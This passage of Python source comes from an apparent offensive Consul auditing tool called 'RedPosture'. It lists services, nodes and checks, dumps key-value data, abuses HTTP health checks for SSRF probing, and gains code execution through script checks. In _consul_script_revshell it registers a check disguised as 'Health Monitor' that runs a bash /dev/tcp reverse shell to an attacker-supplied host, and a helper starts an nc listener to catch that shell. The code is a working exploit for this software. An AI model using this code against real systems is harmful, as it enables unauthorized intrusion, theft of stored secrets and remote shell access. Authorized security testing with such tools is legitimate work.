        parsed_checks: list[dict[str, Any]] = []
        for check in checks_obj:
            if not isinstance(check, dict):
                continue
            check_id = str(check.get("CheckID") or "").strip() or "-"
            agent_check = agent_checks.get(check_id) if isinstance(agent_checks, dict) else None
            if not isinstance(agent_check, dict):
                agent_check = None
            raw_service_id = str(check.get("ServiceID") or "").strip() or None
            if svc_id != "-":
                is_related = bool(
                    (raw_service_id and raw_service_id == svc_id)
                    or check_id == f"service:{svc_id}"
                    or check_id == svc_id
                )
                if not is_related:
                    continue
            check_name = str(check.get("Name") or "").strip() or "-"
            status_text = str(check.get("Status") or "").strip() or "-"
            notes = str(check.get("Notes") or "").strip() or None
            output = str(check.get("Output") or "").strip() or None
            if notes is None and agent_check is not None:
                notes = str(agent_check.get("Notes") or "").strip() or None
            args = _check_args(check, agent_check)
            script_text = _consul_check_script_display(_check_text(check, agent_check, keys=("Script",)), args)
            parsed_checks.append(
                {
                    "check_id": check_id,
                    "name": check_name,
                    "status": status_text,
                    "service_id": raw_service_id,
                    "notes": notes,
                    "output": output,
                    "args": args,
                    "script": script_text,
                    "type": _check_text(check, agent_check, keys=("Type",)),
                    "http": _check_text(check, agent_check, keys=("HTTP", "Http")),
                    "tcp": _check_text(check, agent_check, keys=("TCP", "Tcp")),
                    "grpc": _check_text(check, agent_check, keys=("GRPC", "Grpc")),
                    "method": _check_text(check, agent_check, keys=("Method",)),
                    "interval": _check_text(check, agent_check, keys=("Interval",)),
                    "timeout": _check_text(check, agent_check, keys=("Timeout",)),
                    "ttl": _check_text(check, agent_check, keys=("TTL", "Ttl")),
                    "deregister_after": _check_text(
                        check,
                        agent_check,
                        keys=("DeregisterCriticalServiceAfter",),
                    ),
                    "namespace": _check_enterprise_text(check, agent_check, key="Namespace"),
                    "partition": _check_enterprise_text(check, agent_check, key="Partition"),
                    "definition_raw": _check_definition_json(check, agent_check),
                }
            )

        parsed_checks.sort(
            key=lambda item: (
                str(item.get("service_id") or ""),
                str(item.get("check_id") or ""),
                str(item.get("name") or ""),
            )
        )
        instances.append(
            {
                "service_name": service_name,
                "node_name": node_name,
                "node_address": node_addr,
                "node_datacenter": node_dc,
                "service_id": svc_id,
                "service_address": svc_addr,
                "service_port": svc_port,
                "meta": {str(k): str(v) for k, v in svc_meta.items()},
                "checks": parsed_checks,
            }
        )

    instances.sort(
        key=lambda item: (
            str(item.get("node_name") or ""),
            str(item.get("service_address") or ""),
            int(item.get("service_port") or 0),
            str(item.get("service_id") or ""),
        )
    )
    return instances, None


def _consul_service_action(
    host: str,
    port: int,
    timeout: float,
    *,
    scheme: str,
    insecure: bool,
    headers: dict[str, str] | None,
    service_name: str,
    delete: bool,
    service_args: str | None = None,
) -> dict[str, Any]:
    service_id = service_name.strip()
    action = "delete" if delete else "create"
    result: dict[str, Any] = {
        "name": service_id,
        "id": service_id,
        "action": action,
        "ok": False,
        "status": None,
        "error": None,
        "args": service_args or None,
    }
    if not service_id:
        result["error"] = "empty service name"
        return result

    if delete:
        delete_ids = [service_id]
        # Consul deregistration expects a service ID. Users often provide a service name,
        # so resolve it via /v1/agent/services as a fallback.
        status_lookup, services_payload, lookup_error, _eff_insecure, _tls_auto = _consul_get_json_any(
            host,
            port,
            "/v1/agent/services",
            timeout,
            use_https=(scheme == "https"),
            insecure=insecure,
            headers=headers,
        )
        if lookup_error is None and status_lookup == 200 and isinstance(services_payload, dict):
            for candidate_id, candidate in services_payload.items():
                if not isinstance(candidate, dict):
                    continue
                candidate_name = str(candidate.get("Service") or candidate.get("Name") or "").strip()
                candidate_service_id = str(candidate.get("ID") or candidate_id or "").strip()
                if (
                    candidate_service_id
                    and candidate_service_id not in delete_ids
                    and (candidate_name == service_id or candidate_service_id == service_id)
                ):
                    delete_ids.append(candidate_service_id)

        status = 0
        error: str | None = None
        for delete_id in delete_ids:
            status, error = _consul_put_no_body(
                host,
                port,
                f"/v1/agent/service/deregister/{urllib.parse.quote(delete_id, safe='')}",
                timeout,
                scheme=scheme,
                insecure=insecure,
                headers=headers,
            )
            if error is None and status in {200, 204}:
                result["ok"] = True
                result["id"] = delete_id
                break
        result["status"] = status
        if not result["ok"]:
            result["error"] = error or f"status={status}"
        return result

    payload = {
        "ID": service_id,
        "Name": service_id,
        "Tags": ["redposture"],
        "Port": 65535,
    }
    if service_args:
        payload["Meta"] = {"redposture_args": service_args}
    status, _resp_payload, error = _consul_put_json(
        host,
        port,
        "/v1/agent/service/register",
        timeout,
        payload,
        scheme=scheme,
        insecure=insecure,
        headers=headers,
    )
    result["status"] = status
    if error is None and status in {200, 204}:
        result["ok"] = True
    else:
        result["error"] = error or f"status={status}"
    return result


def _consul_ssrf_probe(
    host: str,
    port: int,
    timeout: float,
    *,
    scheme: str,
    insecure: bool,
    headers: dict[str, str] | None,
    target_url: str,
) -> dict[str, Any]:
    seed = f"{time.time_ns()}:{target_url}".encode("utf-8", errors="ignore")
    check_id = "redposture-ssrf-" + base64.urlsafe_b64encode(seed)[:10].decode("ascii", errors="ignore").rstrip("=")
    # Keep the check interval short so the first run happens quickly; user timeout controls
    # the HTTP probe timeout, not the scheduler cadence.
    interval_seconds = 1
    timeout_seconds = max(1, int(round(max(timeout, 0.2))))
    payload = {
        "ID": check_id,
        "Name": "RedPosture SSRF Check",
        "Notes": f"Target={target_url}",
        "HTTP": target_url,
        "Method": "GET",
        "Interval": f"{interval_seconds}s",
        "Timeout": f"{timeout_seconds}s",
        "TLSSkipVerify": True,
    }
    result: dict[str, Any] = {
        "target_url": target_url,
        "check_id": check_id,
        "registered": False,
        "register_error": None,
        "status": None,
        "output": None,
        "poll_error": None,
        "deregistered": None,
        "deregister_error": None,
    }
    status, _resp_payload, error = _consul_put_json(
        host,
        port,
        "/v1/agent/check/register",
        timeout,
        payload,
        scheme=scheme,
        insecure=insecure,
        headers=headers,
    )
    if error:
        result["register_error"] = error
        return result
    if status not in {200, 204}:
        result["register_error"] = f"status={status}"
        return result
    result["registered"] = True
    try:
        poll_sleep = min(0.6, max(0.2, timeout / 8))
        poll_deadline = time.monotonic() + max(
            4.0,
            float(timeout_seconds + interval_seconds + 2),
            timeout * 2.0,
        )
        while time.monotonic() < poll_deadline:
            time.sleep(poll_sleep)
            _checks_status, checks_payload, checks_error = _consul_get_checks(
                host,
                port,
                timeout,
                scheme=scheme,
                insecure=insecure,
                headers=headers,
            )
            if checks_error:
                result["poll_error"] = checks_error
                continue
            if not isinstance(checks_payload, dict):
                continue
            entry = checks_payload.get(check_id)
            if not isinstance(entry, dict):
                continue
            raw_status = entry.get("Status")
            if isinstance(raw_status, str) and raw_status.strip():
                result["status"] = raw_status.strip()
            raw_output = entry.get("Output")
            if isinstance(raw_output, str) and raw_output.strip():
                result["output"] = raw_output.strip()
            # Consul often creates checks with an initial "critical" before the first real
            # execution. Prefer waiting for Output so the user sees the actual probe result.
            if result["status"] == "passing":
                break
            if result["status"] in {"warning", "critical"} and result["output"]:
                break
    finally:
        dereg_status, dereg_error = _consul_put_no_body(
            host,
            port,
            f"/v1/agent/check/deregister/{urllib.parse.quote(check_id, safe='')}",
            timeout,
            scheme=scheme,
            insecure=insecure,
            headers=headers,
        )
        if dereg_error is None and dereg_status in {200, 204}:
            result["deregistered"] = True
        else:
            result["deregister_error"] = dereg_error or f"status={dereg_status}"
    return result


def _revshell_wait_seconds(timeout: float) -> float:
    try:
        raw = float(timeout)
    except (TypeError, ValueError):
        raw = 0.0
    # Wait long enough for the first 10s interval execution plus a small scheduler slack.
    wait = max(
        _CONSUL_REVSHELL_MIN_WAIT_SECONDS,
        raw,
        float(_CONSUL_REVSHELL_CHECK_INTERVAL_SECONDS) + _CONSUL_REVSHELL_SCHEDULER_SLACK_SECONDS,
    )
    wait = min(_CONSUL_REVSHELL_MAX_WAIT_SECONDS, wait)
    return wait


def _start_local_nc_listener(port: int) -> dict[str, Any]:
    port_value = int(port)
    nc_path = shutil.which("nc")
    rlwrap_path = shutil.which("rlwrap")
    cmd: list[str]
    if rlwrap_path and nc_path:
        cmd = ["rlwrap", "-cAr", "nc", "-lnvp", str(port_value)]
    elif nc_path:
        cmd = ["nc", "-lnvp", str(port_value)]
    else:
        cmd = ["nc", "-lnvp", str(port_value)]
    result: dict[str, Any] = {
        "attempted": True,
        "cmd": " ".join(cmd),
        "port": port_value,
        "started": False,
        "pid": None,
        "process": None,
        "error": None,
    }
    try:
        proc = subprocess.Popen(  # noqa: S603
            cmd,
        )
    except FileNotFoundError:
        if not nc_path:
            result["error"] = "nc not found in PATH"
        else:
            result["error"] = f"{cmd[0]} not found in PATH"
        return result
    except OSError as exc:
        result["error"] = str(exc)
        return result

    time.sleep(0.20)
    rc = proc.poll()
    if rc is None:
        result["started"] = True
        result["pid"] = proc.pid
        result["process"] = proc
        return result

    result["error"] = f"nc exited rc={rc}"
    return result


def _consul_error_detail_text(payload: Any) -> str | None:
    if payload is None:
        return None
    if isinstance(payload, str):
        text = payload.strip()
        return text or None
    if isinstance(payload, (dict, list)):
        try:
            text = json.dumps(payload, ensure_ascii=False, separators=(",", ":"))
        except (TypeError, ValueError):
            text = str(payload)
        text = text.strip()
        return text or None
    text = str(payload).strip()
    return text or None


def _consul_script_revshell(
    host: str,
    port: int,
    timeout: float,
    *,
    scheme: str,
    insecure: bool,
    headers: dict[str, str] | None,
    lhost: str | None,
    lport: int | None,
    payload_cmd: str | None = None,
    check_id: str | None = None,
    wait_after_register: bool = True,
) -> dict[str, Any]:
    auto_cleanup = False
    check_id_value = str(check_id or "").strip() or f"rev-rp-{int(time.time())}-{secrets.token_hex(4)}"
    payload_override = str(payload_cmd or "").strip() or None
    if payload_override:
        script_inner = payload_override
        listener = "custom"
    else:
        if not lhost or lport is None:
            return {
                "attempted": False,
                "listener": None,
                "check_id": check_id_value,
                "script": None,
                "register_mode": None,
                "registered": False,
                "register_status": None,
                "register_error": "missing revshell target (--lhost/--lport) and no --payload provided",
                "wait_seconds": None,
                "auto_cleanup": auto_cleanup,
                "deregistered": None,
                "deregister_status": None,
                "deregister_error": None,
            }
        script_inner = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1 & disown"
        listener = f"{lhost}:{lport}"
    script = f"bash -c {shlex.quote(script_inner)}"
    script_args = ["bash", "-c", script_inner]
    payload_base = {
        "ID": check_id_value,
        "Name": "Health Monitor",
        "Interval": f"{_CONSUL_REVSHELL_CHECK_INTERVAL_SECONDS}s",
        "Timeout": f"{_CONSUL_REVSHELL_CHECK_TIMEOUT_SECONDS}s",
    }
    payload_variants: list[tuple[str, dict[str, Any]]] = [
        ("Script", dict(payload_base, Script=script)),
        ("Args", dict(payload_base, Args=script_args)),
    ]
    result: dict[str, Any] = {
        "attempted": True,
        "listener": listener,
        "check_id": check_id_value,
        "script": script,
        "payload_override": payload_override,
        "register_mode": None,
        "registered": False,
        "register_status": None,
        "register_error": None,
        "wait_seconds": None,
        "auto_cleanup": auto_cleanup,
        "deregistered": None,
        "deregister_status": None,
        "deregister_error": None,
    }
    last_register_status = 0
    last_register_error: str | None = None
    for idx, (register_mode, payload) in enumerate(payload_variants):
        payload_script = payload.get("Script")
        if isinstance(payload_script, str) and payload_script.strip():
            result["script"] = payload_script.strip()
        else:
            payload_args = payload.get("Args")
            if isinstance(payload_args, list):
                args_preview = [str(arg).strip() for arg in payload_args if str(arg).strip()]
                if args_preview:
                    result["script"] = " ".join(args_preview)
        status, resp_payload, error = _consul_put_json(
            host,
            port,
            "/v1/agent/check/register",
            timeout,
            payload,
            scheme=scheme,
            insecure=insecure,
            headers=headers,
        )
        result["register_status"] = status
        result["register_mode"] = register_mode
        if error:
            result["register_error"] = error
            return result
        if status in {200, 204}:
            result["registered"] = True
            break

        detail = _consul_error_detail_text(resp_payload)
        last_register_status = status
        if detail:
            last_register_error = f"status={status} detail={detail}"
        else:
            last_register_error = f"status={status}"

        # Compatibility fallback: some Consul versions reject "Script" and require "Args".
        if not (status == 400 and idx < len(payload_variants) - 1):
            break

    if not result["registered"]:
        result["register_status"] = last_register_status or result.get("register_status")
        result["register_error"] = last_register_error or str(result.get("register_error") or "register failed")
        return result

    if wait_after_register:
        wait_seconds = _revshell_wait_seconds(timeout)
        result["wait_seconds"] = wait_seconds
        time.sleep(wait_seconds)
    else:
        result["wait_seconds"] = 0.0
    return result


def _consul_script_revshell_cleanup(
    host: str,
    port: int,
    timeout: float,
    *,
    scheme: str,
    insecure: bool,
    headers: dict[str, str] | None,
    check_id: str | None = None,
    check_id_prefix: str = _CONSUL_REVSHELL_CHECK_ID_PREFIX,
) -> dict[str, Any]:
    target_check_id = str(check_id or "").strip() or None
    target_mode = "id" if target_check_id else "prefix"
    result: dict[str, Any] = {
        "action": "delete",
        "target_mode": target_mode,
        "target_check_id": target_check_id,
        "check_id_prefix": check_id_prefix,
        "queried": False,
        "query_status": None,
        "query_error": None,
        "matched": 0,
        "deleted": 0,
        "items": [],
    }
    checks_status, checks_payload, checks_error = _consul_get_checks(
        host,
        port,
        timeout,
        scheme=scheme,
        insecure=insecure,
        headers=headers,
    )
    result["query_status"] = checks_status
    if checks_error:
        result["query_error"] = checks_error
        return result
    result["queried"] = True
    if not isinstance(checks_payload, dict):
        result["query_error"] = "invalid checks response"
        return result

    if target_check_id:
        check_ids = [
            str(raw_check_id)
            for raw_check_id in sorted(checks_payload.keys(), key=lambda value: str(value))
            if str(raw_check_id) == target_check_id
        ]
    else:
        check_ids = [
            str(raw_check_id)
            for raw_check_id in sorted(checks_payload.keys(), key=lambda value: str(value))
            if str(raw_check_id).startswith(check_id_prefix)
        ]
    result["matched"] = len(check_ids)

    items: list[dict[str, Any]] = []
    deleted = 0
    for check_id in check_ids:
        dereg_status, dereg_error = _consul_put_no_body(
            host,
            port,
            f"/v1/agent/check/deregister/{urllib.parse.quote(check_id, safe='')}",
            timeout,
            scheme=scheme,
            insecure=insecure,
            headers=headers,
        )
        item = {
            "check_id": check_id,
            "ok": False,
            "status": dereg_status,
            "error": None,
        }
        if dereg_error is None and dereg_status in {200, 204}:
            item["ok"] = True
            deleted += 1
        else:
            item["error"] = dereg_error or f"status={dereg_status}"
        items.append(item)
    result["items"] = items
    result["deleted"] = deleted
    return result


def _audit_consul_host(
    host: str,
    port: int,
    timeout: float,
    retries: int,
    *,
    token: str | None,
    username: str | None,
    password: str | None,
    do_ssrf: bool,
    ssrf_urls: list[str],
    show_keys: bool,
    kv_key: str | None,
    dump_requested: bool,
    dump_all_requested: bool,
    show_services: bool,
    show_agents: bool,
    show_checks: bool,
    check_dump_id: str | None,
    show_nodes: bool,
    service_name: str | None,
    service_dump_name: str | None,
    agent_dump_name: str | None,
    node_dump_name: str | None,
    delete_service: bool,
    service_args: str | None,
    revshell_enabled: bool,
    delete_revshell: bool,
    revshell_listen: bool,
    revshell_host: str | None,
    revshell_port: int | None,
    revshell_payload: str | None,
    revshell_check_id: str | None,
) -> dict[str, Any]:
    attempts = max(1, retries + 1)
    last_error = "connection failed"

    for attempt in range(attempts):
        try:
            started = time.monotonic()
            is_consul, scheme, insecure_effective, tls_auto_insecure, leader, probe_error = _probe_consul_scheme(
                host, port, timeout
            )
            if not is_consul:
                return {
                    "timestamp": utc_now_iso(),
                    "host": host,
                    "port": port,
                    "is_consul": False,
                    "status": "fail" if probe_error else "not_consul",
                    "scheme": None,
                    "insecure_effective": False,
                    "tls_auto_insecure": False,
                    "leader": None,
                    "version": None,
                    "anonymous_scopes": {},
                    "auth_mode": None,
                    "auth_valid": None,
                    "auth_scopes": {},
                    "auth_error": None,
                    "anonymous_self_ok": None,
                    "anonymous_self_error": None,
                    "local_script_checks": None,
                    "remote_script_checks": None,
                    "rce": False,
                    "ssrf_enabled": bool(do_ssrf),
                    "ssrf_results": [],
                    "script_revshell": None,
                    "keys_requested": bool(show_keys),
                    "kv_key_requested": kv_key,
                    "dump_requested": bool(dump_requested),
                    "dump_all_requested": bool(dump_all_requested),
                    "kv_keys_list": None,
                    "kv_keys_error": None,
                    "kv_dump_items": None,
                    "kv_dump_error": None,
                    "services_list_requested": bool(show_services),
                    "service_dump_name": service_dump_name,
                    "services_list_source": None,
                    "services_list": None,
                    "services_list_error": None,
                    "service_instances": None,
                    "service_instances_errors": None,
                    "agents_list_requested": bool(show_agents),
                    "agent_dump_name": agent_dump_name,
                    "agents_list_source": None,
                    "agents_list": None,
                    "agents_list_error": None,
                    "checks_list_requested": bool(show_checks),
                    "check_dump_id": check_dump_id,
                    "checks_list_source": None,
                    "checks_list": None,
                    "checks_list_error": None,
                    "nodes_list_requested": bool(show_nodes),
                    "node_dump_name": node_dump_name,
                    "nodes_list_source": None,
                    "nodes_list": None,
                    "nodes_list_error": None,
                    "service_result": None,
                    "service_args": service_args,
                    "error": probe_error or "not a Consul API",
                    "elapsed_ms": int((time.monotonic() - started) * 1000),
                }

            assert scheme is not None

            anonymous_scopes = _consul_access_matrix(
                host, port, timeout, scheme=scheme, insecure=insecure_effective, headers=None
            )
            anonymous_self = _agent_self_probe(
                host, port, timeout, scheme=scheme, insecure=insecure_effective, headers=None
            )

            auth_mode = None
            auth_valid: bool | None = None
            auth_error: str | None = None
            auth_scopes: dict[str, Any] = {}
            auth_self: dict[str, Any] | None = None

            auth_headers = _consul_headers(token, username, password)
            if token:
                auth_mode = "token"
            elif username is not None or password is not None:
                auth_mode = "basic"

            if auth_mode:
                auth_scopes = _consul_access_matrix(
                    host, port, timeout, scheme=scheme, insecure=insecure_effective, headers=auth_headers
                )
                auth_self = _agent_self_probe(
                    host, port, timeout, scheme=scheme, insecure=insecure_effective, headers=auth_headers
                )
                auth_valid = _all_scopes_ok(auth_scopes) or bool(auth_self.get("ok"))
                if auth_valid is False and _no_scopes_ok(auth_scopes):
                    for name in _CONSUL_SCOPE_NAMES:
                        entry = auth_scopes.get(name) or {}
                        if entry.get("error"):
                            auth_error = str(entry.get("error"))
                            break
                if auth_error is None and isinstance(auth_self, dict) and auth_self.get("error"):
                    auth_error = str(auth_self.get("error"))

            version = None
            local_script_checks = None
            remote_script_checks = None
            for candidate in (anonymous_self, auth_self or {}):
                if not isinstance(candidate, dict):
                    continue
                if (
                    version is None
                    and isinstance(candidate.get("version"), str)
                    and str(candidate.get("version")).strip()
                ):
                    version = str(candidate.get("version")).strip()
                if local_script_checks is None:
                    local_script_checks = candidate.get("local_script_checks")
                if remote_script_checks is None:
                    remote_script_checks = candidate.get("remote_script_checks")

            rce = bool(local_script_checks is True and remote_script_checks is True)

            def _preferred_headers_for_scope(
                scope_name: str | None = None,
                *,
                _auth_mode: str | None = auth_mode,
                _auth_valid: bool | None = auth_valid,
                _auth_headers: dict[str, str] = auth_headers,
                _anonymous_scopes: dict[str, Any] = anonymous_scopes,
            ) -> tuple[dict[str, str] | None, str]:
                if _auth_mode and _auth_valid is True:
                    return _auth_headers, "auth"
                if scope_name and bool((_anonymous_scopes.get(scope_name) or {}).get("ok")):
                    return None, "anonymous"
                return None, "anonymous"

            def _can_fallback_to_anonymous(
                scope_name: str | None = None,
                *,
                _anonymous_scopes: dict[str, Any] = anonymous_scopes,
            ) -> bool:
                if scope_name is None:
                    return True
                return bool((_anonymous_scopes.get(scope_name) or {}).get("ok"))

            kv_keys_list: list[str] | None = None
            kv_keys_error: str | None = None
            kv_dump_items: list[dict[str, Any]] | None = None
            kv_dump_error: str | None = None
            # With --dump --keys, treat --keys as a KV dump scope selector, not an extra keys-only section.
            do_kv_list = bool(show_keys and not dump_requested)
            do_kv_dump = bool(dump_requested and (dump_all_requested or kv_key or show_keys))
            if do_kv_list or do_kv_dump:
                kv_headers, _kv_source = _preferred_headers_for_scope("kv")
                if do_kv_list:
                    kv_keys_list, kv_keys_error = _consul_kv_keys_list(
                        host,
                        port,
                        timeout,
                        scheme=scheme,
                        insecure=insecure_effective,
                        headers=kv_headers,
                    )
                    if kv_keys_list is None and kv_headers is not None and _can_fallback_to_anonymous("kv"):
                        kv_keys_list, kv_keys_error = _consul_kv_keys_list(
                            host,
                            port,
                            timeout,
                            scheme=scheme,
                            insecure=insecure_effective,
                            headers=None,
                        )
                if do_kv_dump:
                    kv_dump_items, kv_dump_error = _consul_kv_dump(
                        host,
                        port,
                        timeout,
                        scheme=scheme,
                        insecure=insecure_effective,
                        headers=kv_headers,
                        key_name=kv_key,
                    )
                    if kv_dump_items is None and kv_headers is not None and _can_fallback_to_anonymous("kv"):
                        kv_dump_items, kv_dump_error = _consul_kv_dump(
                            host,
                            port,
                            timeout,
                            scheme=scheme,
                            insecure=insecure_effective,
                            headers=None,
                            key_name=kv_key,
                        )

            services_list: list[dict[str, Any]] | None = None
            services_list_error: str | None = None
            services_list_source: str | None = None
            service_instances: dict[str, list[dict[str, Any]]] | None = None
            service_instances_errors: dict[str, str] | None = None
            agent_checks_for_services: dict[str, Any] | None = None
            if show_services:
                list_headers, services_list_source = _preferred_headers_for_scope("services")
                services_list, services_list_error = _consul_catalog_services_list(
                    host,
                    port,
                    timeout,
                    scheme=scheme,
                    insecure=insecure_effective,
                    headers=list_headers,
                )
                if services_list is None and list_headers is not None and _can_fallback_to_anonymous("services"):
                    services_list, services_list_error = _consul_catalog_services_list(
                        host,
                        port,
                        timeout,
                        scheme=scheme,
                        insecure=insecure_effective,
                        headers=None,
                    )
                    services_list_source = "anonymous"
                if isinstance(services_list, list) and service_dump_name:
                    services_list = [
                        item
                        for item in services_list
                        if isinstance(item, dict) and str(item.get("name") or "").strip() == service_dump_name
                    ]
                if dump_requested:
                    names_for_details: list[str] = []
                    if isinstance(services_list, list):
                        names_for_details = [
                            str(item.get("name") or "").strip()
                            for item in services_list
                            if isinstance(item, dict) and str(item.get("name") or "").strip()
                        ]
                    elif service_dump_name:
                        names_for_details = [service_dump_name]
                    if names_for_details:
                        service_instances = {}
                        service_instances_errors = {}
                        checks_headers, _checks_source = _preferred_headers_for_scope("agents")
                        _checks_status, checks_payload, _checks_error = _consul_get_checks(
                            host,
                            port,
                            timeout,
                            scheme=scheme,
                            insecure=insecure_effective,
                            headers=checks_headers,
                        )
                        if (
                            checks_payload is None
                            and checks_headers is not None
                            and _can_fallback_to_anonymous("agents")
                        ):
                            _checks_status, checks_payload, _checks_error = _consul_get_checks(
                                host,
                                port,
                                timeout,
                                scheme=scheme,
                                insecure=insecure_effective,
                                headers=None,
                            )
                        if isinstance(checks_payload, dict):
                            agent_checks_for_services = checks_payload
                        for svc_name in names_for_details:
                            detail_headers, _detail_source = _preferred_headers_for_scope("services")
                            details, details_error = _consul_health_service_instances(
                                host,
                                port,
                                svc_name,
                                timeout,
                                scheme=scheme,
                                insecure=insecure_effective,
                                headers=detail_headers,
                                agent_checks=agent_checks_for_services,
                            )
                            if (
                                details is None
                                and detail_headers is not None
                                and _can_fallback_to_anonymous("services")
                            ):
                                details, details_error = _consul_health_service_instances(
                                    host,
                                    port,
                                    svc_name,
                                    timeout,
                                    scheme=scheme,
                                    insecure=insecure_effective,
                                    headers=None,
                                    agent_checks=agent_checks_for_services,
                                )
                            if isinstance(details, list):
                                service_instances[svc_name] = details
                            elif details_error:
                                service_instances_errors[svc_name] = details_error

            agents_list: list[dict[str, Any]] | None = None
            agents_list_error: str | None = None
            agents_list_source: str | None = None
            if show_agents:
                list_headers, agents_list_source = _preferred_headers_for_scope("agents")
                agents_list, agents_list_error = _consul_agent_members_list(
                    host,
                    port,
                    timeout,
                    scheme=scheme,
                    insecure=insecure_effective,
                    headers=list_headers,
                )
                if agents_list is None and list_headers is not None and _can_fallback_to_anonymous("agents"):
                    agents_list, agents_list_error = _consul_agent_members_list(
                        host,
                        port,
                        timeout,
                        scheme=scheme,
                        insecure=insecure_effective,
                        headers=None,
                    )
                    agents_list_source = "anonymous"
                if isinstance(agents_list, list) and agent_dump_name:
                    agents_list = [
                        item
                        for item in agents_list
                        if isinstance(item, dict) and str(item.get("name") or "").strip() == agent_dump_name
                    ]

            checks_list: list[dict[str, Any]] | None = None
            checks_list_error: str | None = None
            checks_list_source: str | None = None
            if show_checks:
                list_headers, checks_list_source = _preferred_headers_for_scope("agents")
                _checks_status, checks_payload, checks_list_error = _consul_get_checks(
                    host,
                    port,
                    timeout,
                    scheme=scheme,
                    insecure=insecure_effective,
                    headers=list_headers,
                )
                if checks_payload is None and list_headers is not None and _can_fallback_to_anonymous("agents"):
                    _checks_status, checks_payload, checks_list_error = _consul_get_checks(
                        host,
                        port,
                        timeout,
                        scheme=scheme,
                        insecure=insecure_effective,
                        headers=None,
                    )
                    checks_list_source = "anonymous"
                if isinstance(checks_payload, dict):
                    checks_list = _consul_agent_checks_list(checks_payload)
                    if check_dump_id:
                        checks_list = [
                            item
                            for item in checks_list
                            if isinstance(item, dict) and str(item.get("check_id") or "").strip() == check_dump_id
                        ]
                    checks_list_error = None

            nodes_list: list[dict[str, Any]] | None = None
            nodes_list_error: str | None = None
            nodes_list_source: str | None = None
            if show_nodes:
                list_headers, nodes_list_source = _preferred_headers_for_scope(None)
                nodes_list, nodes_list_error = _consul_catalog_nodes_list(
                    host,
                    port,
                    timeout,
                    scheme=scheme,
                    insecure=insecure_effective,
                    headers=list_headers,
                )
                if nodes_list is None and list_headers is not None and _can_fallback_to_anonymous(None):
                    nodes_list, nodes_list_error = _consul_catalog_nodes_list(
                        host,
                        port,
                        timeout,
                        scheme=scheme,
                        insecure=insecure_effective,
                        headers=None,
                    )
                    nodes_list_source = "anonymous"
                if isinstance(nodes_list, list) and node_dump_name:
                    nodes_list = [
                        item
                        for item in nodes_list
                        if isinstance(item, dict) and str(item.get("name") or "").strip() == node_dump_name
                    ]

            service_result: dict[str, Any] | None = None
            if service_name:
                service_headers = auth_headers if auth_mode else None
                service_result = _consul_service_action(
                    host,
                    port,
                    timeout,
                    scheme=scheme,
                    insecure=insecure_effective,
                    headers=service_headers,
                    service_name=service_name,
                    delete=delete_service,
                    service_args=service_args,
                )

            ssrf_results: list[dict[str, Any]] = []
            if do_ssrf and ssrf_urls:
                ssrf_headers = auth_headers if auth_mode else None
                for target_url in ssrf_urls:
                    ssrf_results.append(
                        _consul_ssrf_probe(
                            host,
                            port,
                            timeout,
                            scheme=scheme,
                            insecure=insecure_effective,
                            headers=ssrf_headers,
                            target_url=target_url,
                        )
                    )

            script_revshell_result: dict[str, Any] | None = None
            if revshell_enabled or delete_revshell:
                # Keep behavior consistent with other active operations (SSRF/service actions):
                # if user supplied auth, try it for the agent write endpoint.
                script_headers = auth_headers if auth_mode else None
                if delete_revshell:
                    script_revshell_result = _consul_script_revshell_cleanup(
                        host,
                        port,
                        timeout,
                        scheme=scheme,
                        insecure=insecure_effective,
                        headers=script_headers,
                        check_id=revshell_check_id,
                    )
                elif rce and revshell_host and revshell_port:
                    script_revshell_result = _consul_script_revshell(
                        host,
                        port,
                        timeout,
                        scheme=scheme,
                        insecure=insecure_effective,
                        headers=script_headers,
                        lhost=revshell_host,
                        lport=revshell_port,
                        payload_cmd=revshell_payload,
                        check_id=revshell_check_id,
                        wait_after_register=not revshell_listen,
                    )
                elif rce and revshell_payload:
                    script_revshell_result = _consul_script_revshell(
                        host,
                        port,
                        timeout,
                        scheme=scheme,
                        insecure=insecure_effective,
                        headers=script_headers,
                        lhost=None,
                        lport=None,
                        payload_cmd=revshell_payload,
                        check_id=revshell_check_id,
                        wait_after_register=not revshell_listen,
                    )

            return {
                "timestamp": utc_now_iso(),
                "host": host,
                "port": port,
                "is_consul": True,
                "status": "ok",
                "scheme": scheme,
                "insecure_effective": bool(insecure_effective),
                "tls_auto_insecure": bool(tls_auto_insecure),
                "leader": leader,
                "version": version,
                "anonymous_scopes": anonymous_scopes,
                "auth_mode": auth_mode,
                "auth_valid": auth_valid,
                "auth_scopes": auth_scopes,
                "auth_error": auth_error,
                "anonymous_self_ok": anonymous_self.get("ok"),
                "anonymous_self_error": anonymous_self.get("error"),
                "local_script_checks": local_script_checks,
                "remote_script_checks": remote_script_checks,
                "rce": rce,
                "ssrf_enabled": bool(do_ssrf),
                "ssrf_results": ssrf_results,
                "keys_requested": bool(show_keys),
                "kv_key_requested": kv_key,
                "dump_requested": bool(dump_requested),
                "dump_all_requested": bool(dump_all_requested),
                "kv_keys_list": kv_keys_list,
                "kv_keys_error": kv_keys_error,
                "kv_dump_items": kv_dump_items,
                "kv_dump_error": kv_dump_error,
                "services_list_requested": bool(show_services),
                "service_dump_name": service_dump_name,
                "services_list_source": services_list_source,
                "services_list": services_list,
                "services_list_error": services_list_error,
                "service_instances": service_instances,
                "service_instances_errors": service_instances_errors,
                "agents_list_requested": bool(show_agents),
                "agent_dump_name": agent_dump_name,
                "agents_list_source": agents_list_source,
                "agents_list": agents_list,
                "agents_list_error": agents_list_error,
                "checks_list_requested": bool(show_checks),
                "check_dump_id": check_dump_id,
                "checks_list_source": checks_list_source,
                "checks_list": checks_list,
                "checks_list_error": checks_list_error,
                "nodes_list_requested": bool(show_nodes),
                "node_dump_name": node_dump_name,
                "nodes_list_source": nodes_list_source,
                "nodes_list": nodes_list,
                "nodes_list_error": nodes_list_error,
                "service_result": service_result,
                "service_args": service_args,
                "script_revshell": script_revshell_result,
                "error": None,
                "elapsed_ms": int((time.monotonic() - started) * 1000),
            }
        except (OSError, ValueError) as exc:
            last_error = str(exc)
            if attempt >= attempts - 1:
                break
            time.sleep(_retry_delay(attempt))

    return {
        "timestamp": utc_now_iso(),
        "host": host,
        "port": port,
        "is_consul": False,
        "status": "fail",
        "scheme": None,
        "insecure_effective": False,
        "tls_auto_insecure": False,
        "leader": None,
        "version": None,
        "anonymous_scopes": {},
        "auth_mode": None,
        "auth_valid": None,
        "auth_scopes": {},
        "auth_error": None,
        "anonymous_self_ok": None,
        "anonymous_self_error": None,
        "local_script_checks": None,
        "remote_script_checks": None,
        "rce": False,
        "ssrf_enabled": bool(do_ssrf),
        "ssrf_results": [],
        "keys_requested": bool(show_keys),
